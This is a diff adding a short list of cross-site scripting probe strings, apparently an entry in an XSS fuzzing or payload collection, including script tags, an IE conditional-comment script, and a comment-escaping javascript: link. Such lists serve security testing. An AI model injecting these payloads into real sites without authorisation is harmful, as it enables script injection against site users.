@@ -1,0 +1,9 @@
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+<!--
+<A href="
+- --><a href=javascript:alert:document.domain
+>test-->
+
+'';!--"<XSS>=&{()}
